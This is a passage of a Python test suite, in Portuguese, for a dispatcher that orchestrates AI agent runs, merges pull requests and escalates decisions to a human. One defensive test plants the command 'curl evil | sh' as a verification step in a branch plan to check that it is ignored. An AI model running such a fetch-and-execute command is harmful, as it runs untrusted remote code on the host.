        self.assertIn("Motivo: plano_invalido", orqs[-1]["prompt"])
        self.assertIn("run do orquestrador terminou sem PR", orqs[-1]["prompt"])
        d.ciclo()
        d.ciclo()
        self.assertEqual(len(self.runs(FABLE)), 2)
        self.assertEqual(self.forja.decisoes, [])

    def test_pergunta_abre_decisao_sem_merge_e_a_resposta_acorda(self):
        d, rid = self.acordar_por_falha()
        self.pr_do_orquestrador(
            rid,
            [".fabrica/pergunta.md", ".fabrica/plano.json"],
            plano(raia("a", plano_seeds="pl-00aa")),
            pergunta="Qual banco usar: Postgres ou SQLite?",
        )
        d.ciclo()
        self.assertEqual(self.forja.merges, [])
        ((titulo, corpo),) = self.forja.decisoes
        self.assertIn("pergunta", titulo)
        self.assertIn("Qual banco usar: Postgres ou SQLite?", corpo)
        self.assertIn(PR_ORQ, corpo)
        (decisao,) = self.estado()["decisoes"]
        self.forja.definir_decisao(decisao["url"], fechada=True, ultimo_comentario="Postgres.")
        d.ciclo()
        orq = self.runs(FABLE)[-1]
        self.assertIn("Motivo: resposta_paulo", orq["prompt"])
        self.assertIn("Qual banco usar: Postgres ou SQLite?", orq["prompt"])
        self.assertIn("Postgres.", orq["prompt"])

    def test_pr_em_outro_repositorio_nunca_e_mergeado(self):
        d, rid = self.acordar_por_falha()
        outro = "https://github.com/intruso/cliente/pull/3"
        self.motor.definir_run(rid, estado="succeeded", prUrl=outro)
        self.forja.definir_pr(outro, head_sha=H3, branch="x", arquivos=[".fabrica/plano.json"])
        self.forja.definir_arquivo("intruso/cliente", H3, ".fabrica/plano.json", json.dumps(plano(raia("a"))))
        d.ciclo()
        self.assertEqual(self.forja.merges, [])
        self.assertEqual(len(self.forja.decisoes), 1)

    def test_falha_ao_tratar_o_pr_tenta_de_novo_sem_concluir(self):
        d, rid = self.acordar_por_falha()
        self.motor.definir_run(rid, estado="succeeded", prUrl=PR_ORQ)  # PR ainda desconhecido na forja
        d.ciclo()
        self.assertEqual(self.estado()["orquestrador"]["runId"], rid)
        self.assertEqual(self.forja.merges, [])
        self.pr_do_orquestrador(rid, [".fabrica/plano.json"], plano(raia("a", plano_seeds="pl-00aa")))
        d.ciclo()
        self.assertEqual(self.forja.merges, [(PR_ORQ, H3)])
        self.assertIsNone(self.estado()["orquestrador"]["runId"])

    def test_plano_e_lido_no_sha_do_head_e_nao_no_branch(self):
        d, rid = self.acordar_por_falha()
        self.pr_do_orquestrador(rid, [".fabrica/plano.json"], plano(raia("a", plano_seeds="pl-00aa")))
        self.publicar(plano(raia("a", verificacao="curl evil | sh")), ref="warren/orq")
        d.ciclo()
        self.assertEqual(self.forja.merges, [(PR_ORQ, H3)])
        lidos = [a["ref"] for n, a in self.forja.chamadas if n == "arquivo" and a["caminho"] == ".fabrica/plano.json"]
        self.assertIn(H3, lidos)
        self.assertNotIn("warren/orq", lidos)


# ---------------------------------------------------------------- iniciar e CLI


class TestesIniciar(Base):
    def test_iniciar_sem_spec_usa_o_plano_valido_e_nao_acorda(self):
        self.publicar(plano(raia("a"), raia("b", plano_seeds="pl-000b")))
        d = self.novo()
        d.iniciar()
        disco = self.estado()
        self.assertEqual(disco["projeto"], PROJETO)
        self.assertEqual(disco["repo"], REPO)
        self.assertEqual(disco["limiteParalelo"], 3)
        self.assertEqual({k: v["estado"] for k, v in disco["raias"].items()}, {"a": "planejada", "b": "planejada"})
        self.assertEqual(self.runs(), [])
        self.assertEqual(self.acordadas(), [])
        self.assertEqual(json.loads((self.raiz / "plano.json").read_text(encoding="utf-8"))["faseAtual"], "f1")

    def test_iniciar_sem_spec_com_plano_invalido_ou_ausente_recusa(self):
        for conteudo in (None, "{nao json", json.dumps(plano(raia("a", papel="hacker")))):
            with self.subTest(conteudo=conteudo):
                self.setUp()
                if conteudo is not None:
                    self.publicar(conteudo)
                d = self.novo()
                with self.assertRaises(despachante.ErroDeEntrada) as ctx:
                    d.iniciar()
                self.assertTrue(ctx.exception.erros)
                self.assertFalse((self.raiz / "estado.json").exists())

    def test_cli_iniciar_sem_spec_invalido_sai_com_2_e_lista_os_erros(self):
        self.publicar(plano(raia("a", papel="hacker")))
        saida, erro = io.StringIO(), io.StringIO()
        codigo = despachante.main(
            ["iniciar"], ambiente={"FABRICA_RAIZ": str(self.raiz)}, construir=lambda amb: self.novo(), saida=saida, erro=erro
        )
        self.assertEqual(codigo, 2)
        self.assertIn("papel inválido", erro.getvalue())

    def test_iniciar_com_spec_inexistente_nao_acorda(self):
        d = self.novo()
        with self.assertRaises(despachante.ErroDeEntrada):
            d.iniciar(spec="docs/nao-existe.md")
        self.assertEqual(self.runs(), [])

    def test_iniciar_com_spec_repetida_nao_acorda_de_novo(self):
        self.forja.definir_arquivo(REPO, "main", "docs/spec.md", "# spec")
        d = self.novo()
        d.iniciar(spec="docs/spec.md")
        rid = self.estado()["orquestrador"]["runId"]
        self.motor.definir_run(rid, estado="succeeded")
        d.ciclo()  # sem PR: acorda plano_invalido
        n = len(self.runs(FABLE))
        outro = self.novo()
        outro.iniciar(spec="docs/spec.md")
        self.assertEqual(len(self.runs(FABLE)), n)

    def test_cli_iniciar_com_spec_acorda(self):
        self.forja.definir_arquivo(REPO, "main", "docs/spec.md", "# spec")
        codigo = despachante.main(
            ["iniciar", "--spec", "docs/spec.md"],
            ambiente={"FABRICA_RAIZ": str(self.raiz)},
            construir=lambda amb: self.novo(),
            saida=io.StringIO(),
            erro=io.StringIO(),
        )
        self.assertEqual(codigo, 0)
        self.assertEqual(len(self.runs(FABLE)), 1)

    def test_cli_status_e_retomar(self):
        self.publicar(plano(raia("a")))
        self.novo().iniciar()
        disco = self.estado()
        disco["pausado"] = "acordar falhou"
        disco["falhasAcordar"] = 3
        (self.raiz / "estado.json").write_text(json.dumps(disco), encoding="utf-8")
        saida = io.StringIO()
        self.assertEqual(despachante.main(["status"], ambiente={"FABRICA_RAIZ": str(self.raiz)}, saida=saida), 0)
        self.assertIn("a: planejada", saida.getvalue())
        self.assertIn("acordar falhou", saida.getvalue())
        self.assertEqual(
            despachante.main(["retomar"], ambiente={"FABRICA_RAIZ": str(self.raiz)}, saida=io.StringIO()), 0
        )
        disco = self.estado()
        self.assertIsNone(disco["pausado"])
        self.assertEqual(disco["falhasAcordar"], 0)
        (linha,) = [linha for linha in self.log() if linha.get("evento") == "retomar"]
        self.assertEqual(linha["antes"], {"pausado": "acordar falhou", "falhasAcordar": 3})

    def test_cli_sem_raiz_sai_com_2(self):
        erro = io.StringIO()
        self.assertEqual(despachante.main(["status"], ambiente={}, saida=io.StringIO(), erro=erro), 2)
        self.assertIn("FABRICA_RAIZ", erro.getvalue())

    def test_cli_status_em_processo_isolado(self):
        self.publicar(plano(raia("a")))
        self.novo().iniciar()
        r = subprocess.run(
            [sys.executable, "-I", "-B", str(SCRIPT), "status"],
            env={"FABRICA_RAIZ": str(self.raiz), "PATH": os.environ.get("PATH", "")},
            capture_output=True,
            text=True,
            timeout=30,
        )
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertIn("a: planejada", r.stdout)

    def test_construcao_real_le_tokens_dos_arquivos_e_config_do_repo(self):
        (self.repo_dir / ".fabrica").mkdir()
        (self.repo_dir / ".fabrica" / "config.json").write_text(json.dumps(CONFIG), encoding="utf-8")
        (self.tmp / "w").write_text(TOKEN + "\n", encoding="utf-8")
        (self.tmp / "g").write_text(TOKEN_GH + "\n", encoding="utf-8")
        ambiente = {
            "FABRICA_RAIZ": str(self.raiz),
            "FABRICA_REPO_DIR": str(self.repo_dir),
            "FABRICA_PROJETO": PROJETO,
            "FABRICA_REPO": REPO,
            "WARREN_TOKEN_FILE": str(self.tmp / "w"),
            "GH_TOKEN_FILE": str(self.tmp / "g"),
        }
        d = despachante.construir(ambiente)
        self.assertEqual(type(d.motor).__name__, "MotorWarren")
        self.assertEqual(type(d.forja).__name__, "ForjaGitHub")
        self.assertEqual(d.motor._base, "http://127.0.0.1:8080")
        self.assertEqual(d.config["branchPadrao"], "main")
        for faltando in ("FABRICA_REPO_DIR", "FABRICA_PROJETO", "FABRICA_REPO"):
            with self.subTest(faltando=faltando):
                with self.assertRaises(despachante.ErroDeEntrada) as ctx:
                    despachante.construir({k: v for k, v in ambiente.items() if k != faltando})
                self.assertIn(faltando, ctx.exception.erros[0])


# ---------------------------------------------------------------- config


class TestesConfig(Base):
    def test_config_invalida_e_recusada_na_construcao(self):
        casos = {
            "sem protegidos": {k: v for k, v in CONFIG.items() if k != "protegidos"},
            "protegido vazio": dict(CONFIG, protegidos=[""]),
            "sem revisor": dict(CONFIG, modelos={k: v for k, v in CONFIG["modelos"].items() if k != "revisor"}),
            "custo zero": dict(CONFIG, modelos=dict(CONFIG["modelos"], fixer=_modelo(HAIKU, 0))),
            "custo bool": dict(CONFIG, modelos=dict(CONFIG["modelos"], fixer=_modelo(HAIKU, True))),
            "verificacao": dict(CONFIG, verificacao={"imagem": "x", "env": {"GH_TOKEN": "a"}}),
            "sem verificacao": {k: v for k, v in CONFIG.items() if k != "verificacao"},
            "limite": dict(CONFIG, limiteParalelo=0),
        }
        for nome, config in casos.items():
            with self.subTest(nome=nome):
                with self.assertRaises(despachante.ConfigInvalida):
                    self.novo(config=config)

    def test_f_iniciar_recusa_papel_do_plano_sem_modelo(self):
        config = dict(CONFIG, modelos={k: v for k, v in CONFIG["modelos"].items() if k != "qa"})
        self.publicar(plano(raia("a", papel="qa")))
        d = self.novo(config=config)
        with self.assertRaises(despachante.ConfigInvalida) as ctx:
            d.iniciar()
        self.assertIn("qa", str(ctx.exception))
        self.assertFalse((self.raiz / "estado.json").exists())

    def test_n1_plano_adotado_com_papel_sem_modelo_nao_derruba_o_reinicio(self):
        """Sonda p_f_crashloop: com Restart=always, uma exceção na partida seria um loop eterno."""
        config = dict(CONFIG, modelos={k: v for k, v in CONFIG["modelos"].items() if k != "qa"})
        self.config_padrao = config
        d, rid = self.acordar_por_falha()
        novo_plano = plano(raia("a", plano_seeds="pl-000b"), raia("q", papel="qa", plano_seeds="pl-000c", arquivos=["e2e/"]))
        self.pr_do_orquestrador(rid, [".fabrica/plano.json"], novo_plano)
        d.ciclo()
        self.assertEqual(self.forja.merges, [])  # o PR com papel sem modelo vai para o Paulo
        self.assertTrue(any("papéis sem modelo" in c and "qa" in c for _, c in self.forja.decisoes))
        self.publicar(novo_plano)  # o Paulo mergeou assim mesmo
        d.ciclo()
        d.ciclo()
        self.assertIn("q", [x["alvo"] for x in self.estado()["decisoes"]])
        outro = self.novo()  # reinício: não lança
        with mock.patch.object(despachante.Despachante, "ciclo", side_effect=KeyboardInterrupt):
            codigo = despachante.main(
                ["rodar"], ambiente={"FABRICA_RAIZ": str(self.raiz)}, construir=lambda amb: self.novo(), saida=io.StringIO(), erro=io.StringIO()
            )
        self.assertEqual(codigo, 0)
        self.assertIsNotNone(outro.estado)

    def test_f_raia_nao_despachavel_nao_segura_a_vaga_e_abre_uma_decisao(self):
        config = dict(CONFIG, limiteParalelo=1, modelos={k: v for k, v in CONFIG["modelos"].items() if k != "qa"})
        self.publicar(plano(raia("b", plano_seeds="pl-000b")))
        d = self.novo(config=config)
        d.iniciar()
        self.publicar(plano(raia("q", papel="qa", plano_seeds="pl-000c"), raia("b", plano_seeds="pl-000b")))
        d.ciclo()
        d.ciclo()
        (despacho,) = self.planos_despachados()
        self.assertEqual(despacho["plano_seeds"], "pl-000b")
        titulos = [t for t, _ in self.forja.decisoes]
        self.assertEqual(titulos, ["[fábrica] raia q: não pode ser despachada"])
        self.assertIn("modelos.qa", self.forja.decisoes[0][1])
        self.assertEqual(self.estado()["raias"]["q"]["estado"], "planejada")
        self.assertEqual(self.estado()["decisoes"][-1]["alvo"], "q")
        # o Paulo responde; enquanto a raia continuar sem modelo, nenhuma issue nova é aberta
        self.forja.definir_decisao(self.estado()["decisoes"][-1]["url"], fechada=True, ultimo_comentario="vou ajustar a config")
        d.ciclo()
        d.ciclo()
        self.assertEqual(len(self.forja.decisoes), 1)

    def test_ux_engineer_usa_o_modelo_de_ux_ui(self):
        config = copy.deepcopy(CONFIG)
        config["modelos"]["ux-ui"] = _modelo("modelo-ux", 7)
        self.publicar(plano(raia("a", papel="ux-engineer")))
        d = self.novo(config=config)
        d.iniciar()
        d.ciclo()
        (despacho,) = self.planos_despachados()
        self.assertEqual((despacho["modelo"], despacho["max_custo_usd"]), ("modelo-ux", 7))
        self.assertIn(".fabrica/equipes/ux-ui.md", despacho["prompt_template"])

    def test_fixer_le_o_pacote_do_papel_da_raia_normalizado(self):
        d = self.preparar_raia(plano(raia("a", papel="ux-engineer")))
        self.abrir_pr(H1, ci="vermelho")
        d.ciclo()
        self.terminar_revisao(H1)
        acoes = d.ciclo()
        self.assertEqual([a["tipo"] for a in acoes], ["corrigir"])
        (fixer,) = self.runs(HAIKU)
        self.assertIn(".fabrica/equipes/fixer.md", fixer["prompt"])
        self.assertIn(".fabrica/equipes/ux-ui.md", fixer["prompt"])
        self.assertNotIn("ux-engineer", fixer["prompt"])

    def test_fixer_sem_papel_conhecido_nao_e_despachado(self):
        d = self.preparar_raia()
        self.abrir_pr(H1, ci="vermelho")
        d.ciclo()
        self.terminar_revisao(H1)
        # a raia some do plano: sem papel, o fixer não tem pacote para ler e nada é pago
        with mock.patch.object(d, "_papel_da_raia", return_value=None):
            d.ciclo()
            d.ciclo()
        self.assertEqual(self.runs(HAIKU), [])
        self.assertIsNone(self.estado()["seeds"]["s-1"].get("fixerRunId"))
        self.assertTrue(
            any(e.get("erro", "").startswith("_NaoExecutada") and "papel desconhecido" in e["erro"] for e in self.log()),
            self.log(),
        )

    def test_protegidos_fixos_valem_mesmo_fora_da_config(self):
        config = dict(CONFIG, protegidos=["**/migrations/**"])
        self.publicar(plano(raia("a")))
        d = self.novo(config=config)
        d.iniciar()
        d.ciclo()
        self.abrir_pr(H1, arquivos=("src/a/x.ts", ".warren/config.yaml"))
        d.ciclo()
        self.terminar_revisao(H1)
        d.ciclo()
        self.assertEqual(self.forja.merges, [])
        ((_, corpo),) = self.forja.decisoes
        self.assertIn(".github/workflows/ci.yml", corpo)

    def test_plano_invalido_no_branch_nao_substitui_o_anterior(self):
        d = self.preparar_raia()
        self.publicar(plano(raia("a"), raia("a")))
        d.ciclo()
        self.assertEqual(len(json.loads((self.raiz / "plano.json").read_text(encoding="utf-8"))["raias"]), 1)
        self.assertTrue(any("inválido" in a for a in self.estado()["avisos"]))


# ---------------------------------------------------------------- observação


class TestesObservacao(Base):
    def test_falha_ao_ler_o_ci_impede_qualquer_acao_da_seed(self):
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        self.terminar_revisao(H1)
        self.mover_head(H1)
        self.forja._ci.clear()  # o GitHub falha ao responder o CI
        acoes = d.ciclo()
        self.assertEqual(acoes, [])
        self.assertEqual(self.forja.merges, [])

    def test_pr_de_outro_repositorio_nao_e_observado(self):
        d = self.preparar_raia()
        outro = "https://github.com/intruso/cliente/pull/1"
        self.motor.definir_plano(
            "plano-1", "running", [{"seedId": "s-1", "estado": "pr_open", "runId": "r", "prUrl": outro}]
        )
        self.forja.definir_pr(outro, head_sha=H1, branch="x", arquivos=["src/a/x.ts"])
        self.forja.definir_ci("intruso/cliente", H1, "verde")
        self.assertEqual(d.ciclo(), [])
        self.assertEqual(self.runs(), [])
        self.assertTrue(any("intruso/cliente" in a for a in self.estado()["avisos"]))

    def test_pr_fechado_nao_recebe_acoes(self):
        d = self.preparar_raia()
        self.motor.definir_plano(
            "plano-1", "running", [{"seedId": "s-1", "estado": "pr_open", "runId": "r", "prUrl": PR}]
        )
        self.forja.definir_pr(PR, head_sha=H1, branch="warren/s-1", arquivos=["src/a/x.ts"], aberto=False)
        self.forja.definir_ci(REPO, H1, "verde")
        self.assertEqual(d.ciclo(), [])
        self.assertEqual(self.runs(), [])

    def test_falha_ao_abrir_decisao_nao_perde_a_escalada(self):
        class ForjaQueFalhaUmaVez(forja.ForjaFalsa):
            falhou = False

            def abrir_decisao(self, repo, titulo, corpo):
                if not self.falhou:
                    self.falhou = True
                    raise RuntimeError("POST /issues: HTTP 502")
                return super().abrir_decisao(repo, titulo, corpo)

        self.forja = ForjaQueFalhaUmaVez()
        d = self.preparar_raia()
        self.abrir_pr(H1, arquivos=("db/migrations/1.sql",))
        d.ciclo()
        self.terminar_revisao(H1)
        d.ciclo()
        self.assertEqual(self.forja.decisoes, [])
        self.assertNotEqual(self.estado()["seeds"]["s-1"]["estado"], "bloqueada_humano")
        d.ciclo()
        self.assertEqual(len(self.forja.decisoes), 1)
        self.assertEqual(self.estado()["seeds"]["s-1"]["estado"], "bloqueada_humano")

    def test_merge_so_com_o_head_observado(self):
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        d._executar({"tipo": "mergear", "seed": "s-1", "sha": H2})
        self.assertEqual([n for n, _ in self.forja.chamadas if n == "mergear"], [])
        self.assertEqual(self.forja.merges, [])

    def test_merge_recusado_conta_e_escala_na_terceira(self):
        class ForjaQueRecusa(forja.ForjaFalsa):
            def mergear(self, url, sha):
                self._registrar("mergear", url=url, sha=sha)
                return False

        self.forja = ForjaQueRecusa()
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        self.terminar_revisao(H1)
        d.ciclo()
        d.ciclo()
        d.ciclo()
        d.ciclo()
        tentativas = [a for n, a in self.forja.chamadas if n == "mergear"]
        self.assertEqual(len(tentativas), 3)
        self.assertEqual(len(self.forja.decisoes), 1)


# ---------------------------------------------------------------- modelo efetivo


class TestesModeloEfetivo(Base):
    AVISO_REVISOR = (
        f"papel revisor rodou em {SONNET}, configurado {OPUS}: o patch de modelo no Warren é aplicado automaticamente; estado atual: não verificado"
    )

    def test_divergencia_do_revisor_avisa_uma_vez_e_nao_reexecuta(self):
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        rid = self.terminar_revisao(H1, resultado="correcoes", achados=[{"arquivo": "src/a/x.ts", "motivo": "bug"}])
        self.motor.definir_modelo_efetivo(rid, SONNET)
        d.ciclo()  # corrige
        fid = self.estado()["seeds"]["s-1"]["fixerRunId"]
        self.motor.definir_run(fid, estado="succeeded")
        self.mover_head(H2)
        d.ciclo()
        rid2 = self.terminar_revisao(H2)
        self.motor.definir_modelo_efetivo(rid2, SONNET)
        d.ciclo()
        avisos = [a for a in self.estado()["avisos"] if a == self.AVISO_REVISOR]
        self.assertEqual(len(avisos), 1)
        logados = [linha for linha in self.log() if linha.get("mensagem") == self.AVISO_REVISOR]
        self.assertEqual(len(logados), 1)
        self.assertEqual(len(self.runs(OPUS)), 2)  # nenhuma revisão extra por causa do modelo
        self.assertEqual(self.forja.merges, [(PR, H2)])

    def test_modelo_igual_nao_avisa(self):
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        rid = self.terminar_revisao(H1)
        self.motor.definir_modelo_efetivo(rid, OPUS)
        d.ciclo()
        self.assertFalse(any("rodou em" in a for a in self.estado()["avisos"]))
        self.assertIn(("modelo_efetivo", {"run_id": rid}), self.motor.chamadas)

    def test_filho_do_plan_run_e_orquestrador_sao_conferidos(self):
        self.motor.definir_modelo_efetivo("run-filho", HAIKU)
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        d.ciclo()
        esperado = (
            f"papel backend rodou em {HAIKU}, configurado {SONNET}: o patch de modelo no Warren é aplicado automaticamente; estado atual: não verificado"
        )
        self.assertEqual(self.estado()["avisos"].count(esperado), 1)
        conferencias = [a for n, a in self.motor.chamadas if n == "modelo_efetivo" and a["run_id"] == "run-filho"]
        self.assertEqual(len(conferencias), 1)

        self.forja.definir_arquivo(REPO, "main", "docs/spec.md", "# spec")
        d.iniciar(spec="docs/spec.md")
        orq = self.estado()["orquestrador"]["runId"]
        self.motor.definir_modelo_efetivo(orq, OPUS)
        self.motor.definir_run(orq, estado="succeeded")
        d.ciclo()
        self.assertIn(
            f"papel orquestrador rodou em {OPUS}, configurado {FABLE}: o patch de modelo no Warren é aplicado automaticamente; estado atual: não verificado",
            self.estado()["avisos"],
        )

    def test_divergencia_mostra_o_estado_atual_do_preparo_sem_pedir_passo_manual(self):
        self.motor.definir_modelo_efetivo("run-filho", HAIKU)
        d = self.preparar_raia()
        d.estado["warrenPreparado"] = {"estado": "aguardando_runs", "detalhe": "2 runs"}
        d._salvar()
        self.abrir_pr(H1)
        d.ciclo()
        d.ciclo()
        (aviso,) = [a for a in self.estado()["avisos"] if "rodou em" in a]
        self.assertEqual(
            aviso,
            f"papel backend rodou em {HAIKU}, configurado {SONNET}: o patch de modelo no Warren é aplicado automaticamente; "
            "estado atual: aguardando_runs",
        )
        self.assertNotIn("rode", aviso)

    def test_erro_ao_ler_o_modelo_nao_atrapalha(self):
        class MotorSemEventos(motor.MotorFalso):
            def modelo_efetivo(self, run_id):
                raise RuntimeError("GET /runs/x/events: HTTP 500")

        self.motor = MotorSemEventos()
        d = self.preparar_raia()
        self.abrir_pr(H1)
        d.ciclo()
        self.terminar_revisao(H1)
        d.ciclo()
        self.assertEqual(self.forja.merges, [(PR, H1)])


# ---------------------------------------------------------------- rodar, logs e segredos


class ForjaSemLabel(forja.ForjaFalsa):
    def garantir_label(self, repo, nome, cor, descricao):
        super().garantir_label(repo, nome, cor, descricao)
        raise RuntimeError("PUT /labels: HTTP 403 " + TOKEN_GH)


class TestesLabelDeDecisao(Base):
    def test_rodar_garante_o_label_uma_vez_na_partida_sob_a_trava(self):
        d = self.preparar_raia()
        estados_da_trava = []
        original = self.forja.garantir_label

        def garantir(*args):
            try:
                with despachante.travar(self.raiz):
                    estados_da_trava.append("livre")
            except despachante.OutroDespachante:
                estados_da_trava.append("tomada")
            return original(*args)

        self.forja.garantir_label = garantir
        d.rodar(intervalo=1, ciclos=3, dormir=lambda _: None)
        self.assertEqual(estados_da_trava, ["tomada"])
        chamadas = [a for nome, a in self.forja.chamadas if nome == "garantir_label"]
        self.assertEqual(
            chamadas,
            [{"repo": REPO, "label": "fabrica:decisao", "cor": "d93f0b", "descricao": "Decisão pedida pela fábrica de agentes"}],
        )
        self.assertEqual(self.forja.labels, {(REPO, "fabrica:decisao"): {"cor": "d93f0b", "descricao": "Decisão pedida pela fábrica de agentes"}})
        self.assertEqual(self.estado().get("avisos", []), [])

    def test_o_label_e_garantido_antes_do_primeiro_ciclo(self):
        d = self.preparar_raia()
        ordem = []
        original = self.forja.garantir_label
        self.forja.garantir_label = lambda *a: (ordem.append("label"), original(*a))[1]
        ciclo = d.ciclo
        d.ciclo = lambda: (ordem.append("ciclo"), ciclo())[1]
        d.rodar(intervalo=1, ciclos=2, dormir=lambda _: None)
        self.assertEqual(ordem, ["label", "ciclo", "ciclo"])

    def test_cada_partida_do_rodar_garante_de_novo(self):
        d = self.preparar_raia()
        d.rodar(intervalo=1, ciclos=1, dormir=lambda _: None)
        d.rodar(intervalo=1, ciclos=1, dormir=lambda _: None)
        self.assertEqual(len([n for n, _ in self.forja.chamadas if n == "garantir_label"]), 2)

    def test_falha_vira_aviso_unico_sem_segredo_e_nao_impede_a_partida(self):
        self.forja = ForjaSemLabel()
        d = self.preparar_raia()
        ciclos = []
        original = d.ciclo
        d.ciclo = lambda: (ciclos.append(1), original())[1]
        d.rodar(intervalo=1, ciclos=2, dormir=lambda _: None)
        d.rodar(intervalo=1, ciclos=1, dormir=lambda _: None)
        self.assertEqual(len(ciclos), 3)
        avisos = [a for a in self.estado()["avisos"] if "fabrica:decisao" in a]
        self.assertEqual(len(avisos), 1, self.estado()["avisos"])
        self.assertIn("label", avisos[0])
        texto = (self.raiz / "estado.json").read_text(encoding="utf-8") + (self.raiz / "log.jsonl").read_text(encoding="utf-8")
        self.assertNotIn(TOKEN_GH, texto)
        erros = [linha for linha in self.log() if linha.get("evento") == "erro" and linha.get("etapa") == "garantir_label"]
        self.assertTrue(erros)

    def test_falha_do_label_nao_para_o_trabalho_da_partida(self):
        self.forja = ForjaSemLabel()
        d = self.preparar_raia()
        d.rodar(intervalo=1, ciclos=1, dormir=lambda _: None)
        self.assertTrue(self.limpezas)
        self.assertTrue(any(linha.get("evento") == "limpar_residuos" for linha in self.log()))

    def test_ciclo_e_iniciar_nao_chamam_a_forja_para_o_label(self):
        d = self.preparar_raia()
        d.ciclo()
        self.assertEqual([n for n, _ in self.forja.chamadas if n == "garantir_label"], [])


class TestesRodarELogs(Base):
    def test_limpar_residuos_uma_vez_na_partida_com_contagens_no_log(self):
        d = self.preparar_raia()
        sonos = []
        d.rodar(intervalo=5, ciclos=3, dormir=sonos.append)
        self.assertEqual(len(self.limpezas), 1)
        self.assertEqual(sonos, [5, 5])
        (linha,) = [linha for linha in self.log() if linha.get("evento") == "limpar_residuos"]
        self.assertEqual((linha["conteineres"], linha["redes"], linha["diretorios"]), (2, 1, 0))

    def test_cli_rodar_limpa_sob_a_trava(self):
        d = self.preparar_raia()
        estados_da_trava = []

        def limpar():
            try:
                with despachante.travar(self.raiz):
                    estados_da_trava.append("livre")
            except despachante.OutroDespachante:
                estados_da_trava.append("tomada")
            return {"conteineres": 0, "redes": 0, "diretorios": 0, "erros": []}

        d._limpar = limpar
        with mock.patch.object(despachante.Despachante, "ciclo", side_effect=KeyboardInterrupt):
            codigo = despachante.main(
                ["rodar"], ambiente={"FABRICA_RAIZ": str(self.raiz)}, construir=lambda amb: d, saida=io.StringIO()
            )
        self.assertEqual(codigo, 0)
        self.assertEqual(estados_da_trava, ["tomada"])

    def test_retry_after_negativo_vira_zero_e_positivo_estende_a_espera(self):
        for retry, esperado in ((-50, 7), (60, 60)):
            with self.subTest(retry=retry):
                self.setUp()
                self.publicar(plano(raia("a")))
                d = self.novo()
                d.iniciar()
                self.motor.lotar(retry)
                sonos = []
                d.rodar(intervalo=7, ciclos=2, dormir=sonos.append)
                self.assertEqual(sonos, [esperado])
                linha = [linha for linha in self.log() if linha.get("evento") == "acao"][0]
                self.assertEqual(linha["resultado"], {"adiado": True, "retryAfter": max(0, retry)})

    def test_nenhum_token_nem_traceback_no_log_no_estado_ou_avisos(self):
        class MotorQueVaza(motor.MotorFalso):
            def despachar_plano(self, **argumentos):
                try:
                    raise ValueError("causa interna com " + TOKEN)
                except ValueError as causa:
                    raise RuntimeError(f"falhou com Bearer {TOKEN} e {TOKEN_GH}") from causa

        self.motor = MotorQueVaza()
        self.publicar(plano(raia("a")))
        d = self.novo()
        d.iniciar()
        d.rodar(intervalo=0, ciclos=1, dormir=lambda s: None)
        textos = [(self.raiz / nome).read_text(encoding="utf-8") for nome in ("log.jsonl", "estado.json")]
        for texto in textos:
            self.assertNotIn(TOKEN, texto)
            self.assertNotIn(TOKEN_GH, texto)
            self.assertNotIn("Traceback", texto)
            self.assertNotIn("causa interna", texto)
            self.assertNotIn("ValueError", texto)
        (linha,) = [linha for linha in self.log() if linha.get("evento") == "acao"]
        self.assertTrue(linha["erro"].startswith("RuntimeError: falhou com Bearer ***"))
        self.assertEqual(self.estado()["raias"]["a"]["estado"], "falhou")

    def test_erro_no_ciclo_vira_uma_linha_de_log_e_o_laco_segue(self):
        d = self.preparar_raia()
        chamadas = []

        def ciclo_quebrado():
            chamadas.append(1)
            raise RuntimeError("quebrou com " + TOKEN)

        d.ciclo = ciclo_quebrado
        d.rodar(intervalo=0, ciclos=2, dormir=lambda s: None)
        self.assertEqual(len(chamadas), 2)
        erros = [linha for linha in self.log() if linha.get("evento") == "erro_no_ciclo"]
        self.assertEqual(len(erros), 2)
        self.assertEqual(erros[0]["erro"], "RuntimeError: quebrou com ***")

    def test_redacao_vale_para_mensagens_e_para_a_linha_do_log(self):
        segredo_com_aspas = 'abc"def\\ghij'
        d = self.novo(segredos=(TOKEN, segredo_com_aspas, "curto"))
        self.assertEqual(d._erro(RuntimeError("x " + TOKEN)), "RuntimeError: x ***")
        self.assertEqual(d._seguro("y " + segredo_com_aspas), "y ***")
        self.assertEqual(d._seguro("curto"), "curto")  # segredos curtos demais não são redigidos
        d._log({"campo": TOKEN, "outro": segredo_com_aspas})
        bruto = (self.raiz / "log.jsonl").read_text(encoding="utf-8")
        self.assertNotIn(TOKEN, bruto)
        self.assertNotIn(json.dumps(segredo_com_aspas)[1:-1], bruto)
        self.assertNotIn(segredo_com_aspas, bruto)

    def test_aviso_de_acao_nao_executada_nao_leva_token_ao_estado_nem_a_issue(self):
        self.publicar(plano(raia("a", papel="qa")))
        d = self.novo()
        d.iniciar()
        d._modelo = lambda papel: (_ for _ in ()).throw(despachante.ConfigInvalida("modelos.qa " + TOKEN))
        d.ciclo()
        texto = (self.raiz / "estado.json").read_text(encoding="utf-8")
        self.assertNotIn(TOKEN, texto)
        self.assertIn("modelos.qa ***", texto)
        ((titulo, corpo),) = self.forja.decisoes
        self.assertNotIn(TOKEN, titulo + corpo)
        self.assertIn("modelos.qa ***", corpo)

    def test_ciclo_sem_estado_pede_iniciar(self):
        d = self.novo()
        with self.assertRaises(despachante.ErroDeEntrada):
            d.ciclo()


# ---------------------------------------------------------------- rodada 1 (itens A–I)

TITULO_SEM_PLANO = "[fábrica] orquestrador: sem plano válido"


class MotorLeituraFalha(motor.MotorFalso):
    """Leituras (run/plano) de ids escolhidos falham; `todos` faz todas falharem."""

    def __init__(self):
        super().__init__()
        self.falhando = set()
        self.todos = False

    def run(self, run_id):
        if self.todos or run_id in self.falhando:
            self._registrar("run", run_id=run_id)
            raise RuntimeError("GET /runs/%s: HTTP 500" % run_id)
        return super().run(run_id)

    def plano(self, plan_run_id):
        if self.todos or plan_run_id in self.falhando:
            self._registrar("plano", plan_run_id=plan_run_id)
            raise RuntimeError("GET /plan-runs/%s: HTTP 500" % plan_run_id)
        return super().plano(plan_run_id)


class TestesA_CadeiaDoOrquestrador(Base):
    def terminar_sem_pr(self, d, ciclos=8):
        for _ in range(ciclos):
